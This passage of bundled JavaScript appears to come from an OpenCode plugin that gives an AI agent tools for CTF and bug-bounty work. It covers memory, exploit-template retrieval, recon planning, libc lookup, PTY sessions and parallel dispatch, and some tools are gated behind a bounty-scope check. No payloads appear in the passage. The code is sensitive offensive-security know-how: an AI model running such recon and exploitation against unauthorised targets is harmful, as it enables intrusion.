          const tags = Array.isArray(e.tags) ? e.tags.map((t) => t.trim()).filter(Boolean) : [];
          const obs = Array.isArray(e.observations) ? e.observations.map((o) => o.trim()).filter(Boolean) : [];
          let entity = graph.entities.find((x) => x.name === name);
          if (!entity) {
            entity = {
              id: `ent_${randomUUID2()}`,
              name,
              entityType,
              tags,
              createdAt: now,
              updatedAt: now,
              deletedAt: null,
              observations: []
            };
            graph.entities.push(entity);
            createdEntities.push(name);
          } else {
            entity.entityType = entityType;
            entity.updatedAt = now;
            entity.deletedAt = null;
            entity.tags = [...new Set([...entity.tags, ...tags])];
            updatedEntities.push(name);
          }
          for (const content of obs) {
            const exists = entity.observations.some((o) => o.deletedAt === null && o.content === content);
            if (exists)
              continue;
            entity.observations.push({ id: `obs_${randomUUID2()}`, content, createdAt: now, deletedAt: null });
            entity.updatedAt = now;
          }
        }
        const createdRelations = [];
        for (const r of args.relations ?? []) {
          const from = r.from.trim();
          const to = r.to.trim();
          const relationType = r.relationType.trim();
          if (!from || !to || !relationType)
            continue;
          const tags = Array.isArray(r.tags) ? r.tags.map((t) => t.trim()).filter(Boolean) : [];
          const exists = graph.relations.some((x) => x.deletedAt === null && x.from === from && x.to === to && x.relationType === relationType);
          if (exists)
            continue;
          graph.relations.push({
            id: `rel_${randomUUID2()}`,
            from,
            to,
            relationType,
            tags,
            createdAt: now,
            updatedAt: now,
            deletedAt: null
          });
          createdRelations.push(`${from} ${relationType} ${to}`);
        }
        const persisted = writeGraph(graph, { pretty: true });
        if (!persisted.ok) {
          return JSON.stringify({ ok: false, reason: persisted.reason, sessionID }, null, 2);
        }
        return JSON.stringify({
          ok: true,
          sessionID,
          storageDir: config3.memory.storage_dir,
          createdEntities,
          updatedEntities,
          createdRelations,
          persisted: {
            mode: persisted.mode,
            revision: persisted.revision
          }
        }, null, 2);
      }
    }),
    aegis_memory_search: tool({
      description: "Search the local knowledge graph for a query string",
      args: {
        query: schema4.string().min(1),
        limit: schema4.number().int().positive().max(100).default(20)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        if (!config3.memory.enabled) {
          return JSON.stringify({ ok: false, reason: "memory disabled", sessionID }, null, 2);
        }
        const loaded = readGraph();
        if (!loaded.ok) {
          return JSON.stringify({ ok: false, reason: loaded.reason, sessionID }, null, 2);
        }
        const q = args.query.toLowerCase();
        const results = [];
        for (const e of loaded.graph.entities) {
          if (e.deletedAt)
            continue;
          const nameHit = e.name.toLowerCase().includes(q);
          const typeHit = e.entityType.toLowerCase().includes(q);
          const obsHit = e.observations.find((o) => o.deletedAt == null && o.content.toLowerCase().includes(q));
          if (!nameHit && !typeHit && !obsHit)
            continue;
          const match = nameHit ? "name" : typeHit ? "entityType" : "observation";
          results.push({ id: e.id, name: e.name, entityType: e.entityType, match });
          if (results.length >= args.limit)
            break;
        }
        return JSON.stringify({ ok: true, sessionID, query: args.query, results }, null, 2);
      }
    }),
    aegis_memory_list: tool({
      description: "List entities in the local knowledge graph",
      args: {
        limit: schema4.number().int().positive().max(200).default(50)
      },
      execute: async (args, context) => {
        const sessionID = context.sessionID;
        if (!config3.memory.enabled) {
          return JSON.stringify({ ok: false, reason: "memory disabled", sessionID }, null, 2);
        }
        const loaded = readGraph();
        if (!loaded.ok) {
          return JSON.stringify({ ok: false, reason: loaded.reason, sessionID }, null, 2);
        }
        const entities = loaded.graph.entities.filter((e) => !e.deletedAt).sort((a, b) => b.updatedAt.localeCompare(a.updatedAt)).slice(0, args.limit).map((e) => ({
          id: e.id,
          name: e.name,
          entityType: e.entityType,
          tags: e.tags,
          updatedAt: e.updatedAt,
          observations: e.observations.filter((o) => o.deletedAt === null).length
        }));
        return JSON.stringify({ ok: true, sessionID, entities }, null, 2);
      }
    }),
    aegis_memory_delete: tool({
      description: "Delete entities by name (soft delete by default)",
      args: {
        names: schema4.array(schema4.string().min(1)).default([]),
        hard_delete: schema4.boolean().default(false)
      },
      execute: async (args, context) => {
        const startedAt = process.hrtime.bigint();
        const sessionID = context.sessionID;
        if (!config3.memory.enabled) {
          return JSON.stringify({ ok: false, reason: "memory disabled", sessionID }, null, 2);
        }
        const loaded = readGraph();
        if (!loaded.ok) {
          return JSON.stringify({ ok: false, reason: loaded.reason, sessionID }, null, 2);
        }
        const graph = loaded.graph;
        const now = new Date().toISOString();
        const targets = new Set(args.names.map((n) => n.trim()).filter(Boolean));
        if (targets.size === 0) {
          return JSON.stringify({
            ok: true,
            sessionID,
            deleted: 0,
            deletedRelations: 0,
            persisted: null,
            latency_ms: Number((Number(process.hrtime.bigint() - startedAt) / 1e6).toFixed(3))
          }, null, 2);
        }
        let deleted = 0;
        let deletedRelations = 0;
        if (args.hard_delete) {
          const removedNames = new Set;
          const before = graph.entities.length;
          graph.entities = graph.entities.filter((e) => {
            const keep = !targets.has(e.name);
            if (!keep) {
              removedNames.add(e.name);
            }
            return keep;
          });
          deleted = before - graph.entities.length;
          if (removedNames.size > 0) {
            const beforeRelations = graph.relations.length;
            graph.relations = graph.relations.filter((relation) => !removedNames.has(relation.from) && !removedNames.has(relation.to));
            deletedRelations = beforeRelations - graph.relations.length;
          }
        } else {
          for (const e of graph.entities) {
            if (!targets.has(e.name))
              continue;
            if (e.deletedAt)
              continue;
            e.deletedAt = now;
            e.updatedAt = now;
            deleted += 1;
          }
          if (deleted > 0) {
            for (const relation of graph.relations) {
              if (relation.deletedAt)
                continue;
              if (!targets.has(relation.from) && !targets.has(relation.to))
                continue;
              relation.deletedAt = now;
              relation.updatedAt = now;
              deletedRelations += 1;
            }
          }
        }
        if (deleted === 0 && deletedRelations === 0) {
          return JSON.stringify({
            ok: true,
            sessionID,
            deleted,
            deletedRelations,
            persisted: null,
            latency_ms: Number((Number(process.hrtime.bigint() - startedAt) / 1e6).toFixed(3))
          }, null, 2);
        }
        const persisted = writeGraph(graph, {
          defer: !args.hard_delete,
          pretty: false
        });
        if (!persisted.ok) {
          return JSON.stringify({ ok: false, reason: persisted.reason, sessionID }, null, 2);
        }
        const latencyMs = Number((Number(process.hrtime.bigint() - startedAt) / 1e6).toFixed(3));
        return JSON.stringify({
          ok: true,
          sessionID,
          deleted,
          deletedRelations,
          persisted: {
            mode: persisted.mode,
            revision: persisted.revision
          },
          latency_ms: latencyMs
        }, null, 2);
      }
    }),
    aegis_think: tool({
      description: "Record structured step-by-step reasoning to durable notes",
      args: {
        thought: schema4.string().min(1),
        nextThoughtNeeded: schema4.boolean(),
        thoughtNumber: schema4.number().int().min(1),
        totalThoughts: schema4.number().int().min(1),
        isRevision: schema4.boolean().optional(),
        revisesThought: schema4.number().int().min(1).optional(),
        branchFromThought: schema4.number().int().min(1).optional(),
        branchId: schema4.string().min(1).optional(),
        needsMoreThoughts: schema4.boolean().optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!config3.sequential_thinking.enabled) {
          return JSON.stringify({ ok: false, reason: "sequential thinking disabled", sessionID }, null, 2);
        }
        const state = ensureThinkState(sessionID);
        const adjustedTotal = Math.max(state.totalThoughts, args.totalThoughts, args.thoughtNumber);
        state.totalThoughts = adjustedTotal;
        state.thoughtHistoryLength += 1;
        if (args.branchId && typeof args.branchFromThought === "number") {
          state.branches.add(args.branchId);
        }
        const recorded = appendThinkRecord(sessionID, {
          tool: config3.sequential_thinking.tool_name,
          thought: args.thought,
          nextThoughtNeeded: args.nextThoughtNeeded,
          thoughtNumber: args.thoughtNumber,
          totalThoughts: adjustedTotal,
          isRevision: args.isRevision ?? false,
          revisesThought: args.revisesThought ?? null,
          branchFromThought: args.branchFromThought ?? null,
          branchId: args.branchId ?? null,
          needsMoreThoughts: args.needsMoreThoughts ?? null
        });
        if (!recorded.ok) {
          return JSON.stringify({ ok: false, reason: recorded.reason, sessionID }, null, 2);
        }
        return JSON.stringify({
          thoughtNumber: args.thoughtNumber,
          totalThoughts: adjustedTotal,
          nextThoughtNeeded: args.nextThoughtNeeded,
          branches: [...state.branches],
          thoughtHistoryLength: state.thoughtHistoryLength
        }, null, 2);
      }
    }),
    ctf_orch_postmortem: tool({
      description: "Summarize failure reasons and suggest next adaptive route",
      args: {
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const state = store.get(sessionID);
        const decision = route(state, config3);
        const topReasons = FAILURE_REASON_VALUES.map((reason) => ({
          reason,
          count: state.failureReasonCounts[reason]
        })).filter((item) => item.count > 0).sort((a, b) => b.count - a.count);
        const recommendation = state.lastFailureReason === "verification_mismatch" ? state.verifyFailCount >= (config3.stuck_threshold ?? 2) ? "Repeated verification mismatch: treat as decoy/constraint mismatch and pivot via stuck route." : "Route through ctf-decoy-check then ctf-verify for candidate validation." : state.lastFailureReason === "tooling_timeout" || state.lastFailureReason === "context_overflow" ? "Use failover/compaction path and reduce output/context size before retry." : state.lastFailureReason === "hypothesis_stall" ? "Pivot hypothesis immediately and run cheapest disconfirm test next." : state.lastFailureReason === "unsat_claim" ? "UNSAT gate active: require at least two alternatives and reproducible observation evidence before unsat conclusion; continue disconfirm loop." : state.lastFailureReason === "static_dynamic_contradiction" ? "Static/dynamic contradiction detected: run extraction-first pivot on target-aware scan route, then escalate via stuck route." : state.lastFailureReason === "exploit_chain" ? "Stabilize exploit chain with deterministic repro artifacts before rerun." : state.lastFailureReason === "environment" ? "Fix runtime environment/tool availability before continuing exploitation." : "No recent classified failure reason; continue normal route.";
        return JSON.stringify({
          sessionID,
          lastFailureReason: state.lastFailureReason,
          lastFailureSummary: state.lastFailureSummary,
          lastFailedRoute: state.lastFailedRoute,
          lastFailureAt: state.lastFailureAt,
          topReasons,
          recommendation,
          nextDecision: decision
        }, null, 2);
      }
    }),
    ctf_orch_failover: tool({
      description: "Resolve fallback agent name from original agent + error text",
      args: {
        agent: schema4.string(),
        error: schema4.string()
      },
      execute: async (args) => {
        const fallback = resolveFailoverAgent(args.agent, args.error, config3.failover);
        return JSON.stringify({ original: args.agent, fallback: fallback ?? "NONE" }, null, 2);
      }
    }),
    ctf_orch_check_budgets: tool({
      description: "Check markdown budget overflows in runtime notes",
      args: {},
      execute: async () => {
        const issues = notesStore.checkBudgets();
        return JSON.stringify({ ok: issues.length === 0, issues }, null, 2);
      }
    }),
    ctf_orch_compact: tool({
      description: "Compact/rotate markdown notes that exceed budget limits",
      args: {},
      execute: async () => {
        const actions = notesStore.compactNow();
        return JSON.stringify({ actions }, null, 2);
      }
    }),
    ctf_orch_readiness: tool({
      description: "Check subagent/MCP mappings and notes writability readiness",
      args: {},
      execute: async () => {
        const report = buildReadinessReport(projectDir, notesStore, config3);
        return JSON.stringify(report, null, 2);
      }
    }),
    ctf_orch_doctor: tool({
      description: "Diagnose environment/provider/model readiness (providers, models, and Aegis/OpenCode config cohesion)",
      args: {
        include_models: schema4.boolean().optional(),
        max_models: schema4.number().int().positive().optional()
      },
      execute: async (args) => {
        const includeModels = args.include_models === true;
        const maxModels = args.max_models ?? 10;
        const readiness = buildReadinessReport(projectDir, notesStore, config3);
        const providerResult = await callConfigProviders(projectDir);
        const usedModels = extractAgentModels(readiness.checkedConfigPath);
        const usedProviders = [...new Set(usedModels.map(providerIdFromModel4).filter(Boolean))];
        const providerSummary = providerResult.ok && providerResult.data ? providerResult.data.providers.map((p) => {
          const id = typeof p.id === "string" ? p.id : "";
          const name = typeof p.name === "string" ? p.name : "";
          const source = typeof p.source === "string" ? p.source : "";
          const env = Array.isArray(p.env) ? p.env : [];
          const modelsObj = isRecord(p.models) ? p.models : {};
          const modelKeys = Object.keys(modelsObj);
          return {
            id,
            name,
            source,
            env,
            modelCount: modelKeys.length,
            models: includeModels ? modelKeys.slice(0, maxModels) : undefined
          };
        }) : [];
        const availableProviderIds = new Set(providerSummary.map((p) => p.id).filter(Boolean));
        const missingProviders = usedProviders.filter((pid) => pid && !availableProviderIds.has(pid));
        const modelLookup = new Map;
        for (const p of providerSummary) {
          if (!p.id)
            continue;
          const models = new Set;
          if (Array.isArray(p.models)) {
            for (const m of p.models) {
              if (typeof m === "string" && m)
                models.add(m);
            }
          }
          modelLookup.set(p.id, models);
        }
        const missingModels = [];
        if (includeModels) {
          for (const m of usedModels) {
            const pid = providerIdFromModel4(m);
            const mid = modelIdFromModel(m);
            const models = modelLookup.get(pid);
            if (!models) {
              continue;
            }
            if (models.has(m) || mid && models.has(mid)) {
              continue;
            }
            missingModels.push({
              model: m,
              reason: `model id not found in provider '${pid}' (checked '${m}' and '${mid}')`
            });
          }
        }
        return JSON.stringify({
          readiness,
          providers: providerResult.ok ? { ok: true, count: providerSummary.length, providers: providerSummary } : { ok: false, reason: providerResult.reason },
          agentModels: {
            usedModels,
            usedProviders,
            missingProviders,
            missingModels
          }
        }, null, 2);
      }
    }),
    ctf_orch_slash: tool({
      description: "Run an OpenCode slash workflow by submitting a synthetic prompt",
      args: {
        command: schema4.enum(["init-deep", "refactor", "start-work", "ralph-loop", "ulw-loop"]),
        arguments: schema4.string().optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const command = args.command;
        const extra = (args.arguments ?? "").trim();
        const text = extra ? `/${command} ${extra}` : `/${command}`;
        const result = await callPromptAsync(sessionID, text, {
          source: "oh-my-Aegis.slash",
          command
        });
        return JSON.stringify({ sessionID, command, text, ...result }, null, 2);
      }
    }),
    ctf_orch_exploit_template_list: tool({
      description: "List built-in exploit templates by domain",
      args: {
        domain: schema4.enum(["PWN", "CRYPTO", "WEB", "WEB3", "REV", "FORENSICS", "MISC"]).optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const domain3 = args.domain;
        const templates = listExploitTemplates(domain3);
        return JSON.stringify({ sessionID, domain: domain3 ?? "ALL", templates }, null, 2);
      }
    }),
    ctf_orch_exploit_template_get: tool({
      description: "Get a built-in exploit template by id",
      args: {
        domain: schema4.enum(["PWN", "CRYPTO", "WEB", "WEB3", "REV", "FORENSICS", "MISC"]),
        id: schema4.string().min(1),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const entry = getExploitTemplate(args.domain, args.id);
        if (!entry) {
          return JSON.stringify({ ok: false, reason: "template not found", sessionID, domain: args.domain, id: args.id }, null, 2);
        }
        return JSON.stringify({ ok: true, sessionID, template: entry }, null, 2);
      }
    }),
    ctf_auto_triage: tool({
      description: "Auto-triage a challenge file: detect type, suggest target, generate scan commands",
      args: {
        file_path: schema4.string().min(1),
        file_output: schema4.string().optional()
      },
      execute: async (args) => {
        const result = triageFile(args.file_path, args.file_output);
        return JSON.stringify(result, null, 2);
      }
    }),
    ctf_flag_scan: tool({
      description: "Scan text for flag patterns and return candidates",
      args: {
        text: schema4.string().min(1),
        source: schema4.string().default("manual"),
        custom_pattern: schema4.string().optional()
      },
      execute: async (args) => {
        if (args.custom_pattern) {
          setCustomFlagPattern(args.custom_pattern);
        }
        const found = scanForFlags(args.text, args.source);
        return JSON.stringify({
          found,
          alert: found.length > 0 ? buildFlagAlert(found) : null,
          allCandidates: getCandidates()
        }, null, 2);
      }
    }),
    ctf_pattern_match: tool({
      description: "Match known CTF/security patterns in text",
      args: {
        text: schema4.string().min(1),
        target_type: schema4.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]).optional()
      },
      execute: async (args) => {
        const targetType = args.target_type;
        const matches = matchPatterns(args.text, targetType);
        return JSON.stringify({
          matches,
          summary: matches.length > 0 ? buildPatternSummary(matches) : "No patterns matched."
        }, null, 2);
      }
    }),
    ctf_recon_pipeline: tool({
      description: "Plan a multi-phase BOUNTY recon pipeline for a target",
      args: {
        target: schema4.string().min(1),
        scope: schema4.array(schema4.string()).optional(),
        templates: schema4.string().optional()
      },
      execute: async (args, context) => {
        const blocked = blockIfBountyScopeUnconfirmed(context.sessionID, "ctf_recon_pipeline");
        if (blocked) {
          return blocked;
        }
        const state = store.get(context.sessionID);
        const pipeline = planReconPipeline(state, config3, args.target, { scope: args.scope });
        return JSON.stringify({ pipeline, templates: args.templates ?? null }, null, 2);
      }
    }),
    ctf_delta_scan: tool({
      description: "Save/query/compare scan snapshots for delta-aware scanning",
      args: {
        action: schema4.enum(["save", "query", "should_rescan"]),
        target: schema4.string().min(1),
        template_set: schema4.string().default("default"),
        findings: schema4.array(schema4.string()).optional(),
        hosts: schema4.array(schema4.string()).optional(),
        ports: schema4.array(schema4.number()).optional(),
        max_age_ms: schema4.number().optional()
      },
      execute: async (args, context) => {
        const blocked = blockIfBountyScopeUnconfirmed(context.sessionID, "ctf_delta_scan");
        if (blocked) {
          return blocked;
        }
        if (args.action === "save") {
          const snapshot = {
            id: randomUUID2(),
            target: args.target,
            templateSet: args.template_set,
            timestamp: Date.now(),
            assets: [
              ...args.hosts ?? [],
              ...(args.ports ?? []).map((p) => `port:${String(p)}`)
            ],
            findings: args.findings ?? []
          };
          saveScanSnapshot(snapshot);
          return JSON.stringify({ ok: true, saved: snapshot }, null, 2);
        }
        if (args.action === "query") {
          const current = {
            id: randomUUID2(),
            target: args.target,
            templateSet: args.template_set,
            timestamp: Date.now(),
            assets: [
              ...args.hosts ?? [],
              ...(args.ports ?? []).map((p) => `port:${String(p)}`)
            ],
            findings: args.findings ?? []
          };
          const latest = getLatestSnapshot(args.target);
          const delta = latest ? computeDelta(latest, current) : null;
          const summary = buildDeltaSummary(args.target, {
            ...current
          });
          return JSON.stringify({ ok: true, summary, latest, delta }, null, 2);
        }
        if (args.action === "should_rescan") {
          const rescan = shouldRescan(args.target, args.template_set, args.max_age_ms);
          return JSON.stringify({ ok: true, shouldRescan: rescan }, null, 2);
        }
        return JSON.stringify({ ok: false, reason: "unknown action" }, null, 2);
      }
    }),
    ctf_tool_recommend: tool({
      description: "Get recommended security tools for a target type",
      args: {
        target_type: schema4.enum(["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"])
      },
      execute: async (args, context) => {
        const blocked = blockIfBountyScopeUnconfirmed(context.sessionID, "ctf_tool_recommend");
        if (blocked) {
          return blocked;
        }
        const tools = recommendedTools(args.target_type);
        return JSON.stringify({ tools }, null, 2);
      }
    }),
    ctf_libc_lookup: tool({
      description: "Lookup libc versions from leaked function addresses",
      args: {
        lookups: schema4.array(schema4.object({
          symbol: schema4.string().min(1),
          address: schema4.string().min(1)
        })),
        compute_base_leaked_address: schema4.string().optional(),
        compute_base_symbol_offset: schema4.number().optional()
      },
      execute: async (args) => {
        const requests = args.lookups.map((l) => ({
          symbolName: l.symbol,
          address: l.address
        }));
        const result = localLookup(requests);
        const summary = buildLibcSummary(result);
        const libcRipUrl = buildLibcRipUrl(requests);
        let base = null;
        if (args.compute_base_leaked_address && typeof args.compute_base_symbol_offset === "number") {
          base = computeLibcBase(args.compute_base_leaked_address, args.compute_base_symbol_offset);
        }
        return JSON.stringify({ result, summary, libcRipUrl, computedBase: base }, null, 2);
      }
    }),
    ctf_env_parity: tool({
      description: "Check environment parity between local and remote for PWN challenges",
      args: {
        dockerfile_content: schema4.string().optional(),
        ldd_output: schema4.string().optional(),
        binary_path: schema4.string().optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const hasRemote = typeof args.dockerfile_content === "string" && args.dockerfile_content.trim().length > 0;
        const hasLocal = typeof args.ldd_output === "string" && args.ldd_output.trim().length > 0;
        if (!hasRemote || !hasLocal) {
          store.setEnvParity(sessionID, false, "Parity baseline requires both remote (dockerfile) and local (ldd) evidence.");
          return JSON.stringify({
            ok: false,
            sessionID,
            reason: "ctf_env_parity requires both dockerfile_content and ldd_output for enforceable parity baseline"
          }, null, 2);
        }
        const remote = {};
        if (args.dockerfile_content) {
          Object.assign(remote, parseDockerfile(args.dockerfile_content));
        }
        const local = {};
        if (args.ldd_output) {
          const parsed = parseLddOutput(args.ldd_output);
          if (parsed) {
            local.libcVersion = parsed.version;
            local.libcPath = parsed.libcPath;
          }
        }
        const report = buildParityReport(local, remote);
        const summary = buildParitySummary(report);
        const localCommands = localEnvCommands();
        store.setEnvParity(sessionID, report.allMatch, summary);
        return JSON.stringify({ report, summary, localCommands }, null, 2);
      }
    }),
    ctf_parity_runner: tool({
      description: "Run local/docker/remote parity comparison on concrete outputs",
      args: {
        local_output: schema4.string().optional(),
        docker_output: schema4.string().optional(),
        remote_output: schema4.string().optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const result = runParityRunner({
          localOutput: args.local_output,
          dockerOutput: args.docker_output,
          remoteOutput: args.remote_output
        });
        if (result.checkedPairs > 0) {
          store.setEnvParity(sessionID, result.ok, result.summary);
        }
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_contradiction_runner: tool({
      description: "Compare expected hypothesis outcomes vs observed runtime output",
      args: {
        hypothesis: schema4.string().default(""),
        expected: schema4.array(schema4.string()).default([]),
        observed_output: schema4.string().default(""),
        expected_exit_code: schema4.number().int().optional(),
        observed_exit_code: schema4.number().int().optional(),
        apply_event: schema4.boolean().default(true),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const result = runContradictionRunner({
          hypothesis: args.hypothesis,
          expected: args.expected,
          observedOutput: args.observed_output,
          expectedExitCode: args.expected_exit_code,
          observedExitCode: args.observed_exit_code
        });
        if (result.contradictory && args.apply_event) {
          store.recordFailure(sessionID, "static_dynamic_contradiction", "ctf_contradiction_runner", result.summary);
          store.applyEvent(sessionID, "static_dynamic_contradiction");
        }
        return JSON.stringify({ sessionID, result }, null, 2);
      }
    }),
    ctf_evidence_ledger: tool({
      description: "Append/scoring evidence ledger entries with L0-L3 output",
      args: {
        event: schema4.string().default("manual"),
        evidence_type: schema4.enum([
          "string_pattern",
          "static_reverse",
          "dynamic_memory",
          "behavioral_runtime",
          "acceptance_oracle"
        ]),
        confidence: schema4.number().min(0).max(1).default(0.8),
        summary: schema4.string().default(""),
        source: schema4.string().default("manual"),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const entry = {
          at: new Date().toISOString(),
          sessionID,
          event: args.event,
          evidenceType: args.evidence_type,
          confidence: args.confidence,
          summary: args.summary.replace(/\s+/g, " ").trim().slice(0, 240),
          source: args.source
        };
        const persisted = appendEvidenceLedger(notesStore.getRootDirectory(), entry);
        const scored = scoreEvidence([entry]);
        store.setCandidateLevel(sessionID, scored.level);
        return JSON.stringify({ ok: persisted.ok, sessionID, entry, scored, ...persisted.ok ? {} : persisted }, null, 2);
      }
    }),
    ctf_report_generate: tool({
      description: "Generate a CTF writeup or BOUNTY report from session notes",
      args: {
        mode: schema4.enum(["CTF", "BOUNTY"]),
        challenge_name: schema4.string().default("Challenge"),
        worklog: schema4.string().default(""),
        evidence: schema4.string().default(""),
        target_type: schema4.string().optional(),
        flag: schema4.string().optional()
      },
      execute: async (args) => {
        const reportOptions = {
          challengeName: args.challenge_name,
          programName: args.challenge_name
        };
        if (args.target_type) {
          reportOptions.category = args.target_type;
          reportOptions.endpoint = args.target_type;
        }
        if (args.flag) {
          reportOptions.flag = args.flag;
        }
        const report = generateReport(args.mode, args.worklog, args.evidence, reportOptions);
        const markdown = formatReportMarkdown(report);
        return JSON.stringify({ report, markdown }, null, 2);
      }
    }),
    ctf_subagent_dispatch: tool({
      description: "Plan a dispatch for aegis-explore or aegis-librarian subagent",
      args: {
        query: schema4.string().min(1),
        type: schema4.enum(["explore", "librarian", "auto"]).default("auto")
      },
      execute: async (args, context) => {
        const blocked = blockIfBountyScopeUnconfirmed(context.sessionID, "ctf_subagent_dispatch");
        if (blocked) {
          return blocked;
        }
        const state = store.get(context.sessionID);
        const agentType = args.type === "auto" ? detectSubagentType(args.query) : args.type;
        const plan = agentType === "explore" ? planExploreDispatch(state, args.query) : planLibrarianDispatch(state, args.query);
        return JSON.stringify({ agentType, plan }, null, 2);
      }
    }),
    ctf_orch_pty_create: tool({
      description: "Create a PTY session for interactive workflows",
      args: {
        command: schema4.string().min(1),
        args: schema4.array(schema4.string()).optional(),
        cwd: schema4.string().optional(),
        title: schema4.string().optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const body = {
          command: args.command
        };
        if (args.args)
          body.args = args.args;
        if (args.cwd)
          body.cwd = args.cwd;
        if (args.title)
          body.title = args.title;
        const result = await callPtyCreate(projectDir, body);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_list: tool({
      description: "List PTY sessions for this project",
      args: {},
      execute: async (_args, context) => {
        const sessionID = context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const result = await callPtyList(projectDir);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_get: tool({
      description: "Get a PTY session by id",
      args: {
        pty_id: schema4.string().min(1),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const result = await callPtyGet(projectDir, args.pty_id);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_update: tool({
      description: "Update a PTY session (title/size)",
      args: {
        pty_id: schema4.string().min(1),
        title: schema4.string().optional(),
        rows: schema4.number().int().positive().optional(),
        cols: schema4.number().int().positive().optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const body = {};
        if (args.title)
          body.title = args.title;
        if (args.rows && args.cols) {
          body.size = { rows: args.rows, cols: args.cols };
        }
        const result = await callPtyUpdate(projectDir, args.pty_id, body);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_remove: tool({
      description: "Remove (terminate) a PTY session",
      args: {
        pty_id: schema4.string().min(1),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const result = await callPtyRemove(projectDir, args.pty_id);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_orch_pty_connect: tool({
      description: "Connect info for a PTY session",
      args: {
        pty_id: schema4.string().min(1),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        if (!isInteractiveEnabledForSession(sessionID)) {
          return JSON.stringify({ ok: false, reason: "interactive disabled", sessionID }, null, 2);
        }
        const result = await callPtyConnect(projectDir, args.pty_id);
        return JSON.stringify({ sessionID, ...result }, null, 2);
      }
    }),
    ctf_parallel_dispatch: tool({
      description: "Dispatch parallel child sessions for CTF scanning/hypothesis testing. " + "Creates N child sessions, each with a different agent/purpose, and sends prompts concurrently. " + "Use plan='scan' for initial parallel recon or plan='hypothesis' with hypotheses array.",
      args: {
        plan: schema4.enum(["scan", "hypothesis", "deep_worker"]),
        challenge_description: schema4.string().optional(),
        goal: schema4.string().optional(),
        hypotheses: schema4.string().optional(),
        max_tracks: schema4.number().int().min(1).max(5).optional(),
        session_id: schema4.string().optional()
      },
      execute: async (args, context) => {
        const sessionID = args.session_id ?? context.sessionID;
        const blocked = blockIfBountyScopeUnconfirmed(sessionID, "ctf_parallel_dispatch");
        if (blocked) {
          return blocked;
        }
        const sessionClient = extractSessionClient(client);
        if (!sessionClient) {
          return JSON.stringify({
            ok: false,
            reason: "SDK session client not available (requires session.create + session.promptAsync)",
            sessionID
          }, null, 2);
        }
        parallelBackgroundManager.bindSessionClient(sessionClient);
        const activeGroup = getActiveGroup(sessionID);
        if (activeGroup) {
          return JSON.stringify({
            ok: false,
            reason: "Active parallel group already exists. Use ctf_parallel_collect or ctf_parallel_abort first.",
            sessionID,
            activeGroup: groupSummary(activeGroup)
          }, null, 2);
        }
        const state = store.get(sessionID);
        const bountyScanDefaultMaxTracks = config3.parallel.bounty_scan.max_tracks;
        const maxTracks = args.max_tracks ?? (args.plan === "scan" && state.mode === "BOUNTY" ? bountyScanDefaultMaxTracks : 3);
        let dispatchPlan;
        if (args.plan === "scan") {
          dispatchPlan = planScanDispatch(state, config3, args.challenge_description ?? "");
        } else if (args.plan === "deep_worker") {
          const goal = (args.goal ?? args.challenge_description ?? "").trim();
          dispatchPlan = planDeepWorkerDispatch(state, config3, goal);
        } else {
          let parsedHypotheses = [];
          if (args.hypotheses) {
            try {
              const raw = JSON.parse(args.hypotheses);
              if (Array.isArray(raw)) {
                parsedHypotheses = raw.filter((h) => h && typeof h === "object").map((h) => ({
                  hypothesis: String(h.hypothesis ?? h.h ?? ""),
                  disconfirmTest: String(h.disconfirmTest ?? h.disconfirm ?? h.test ?? "")
                })).filter((h) => h.hypothesis.length > 0);
              }
            } catch {
              return JSON.stringify({
                ok: false,
                reason: "Failed to parse hypotheses JSON. Expected: [{hypothesis, disconfirmTest}, ...]",
                sessionID
              }, null, 2);
            }
          }
          if (parsedHypotheses.length === 0) {
            return JSON.stringify({
              ok: false,
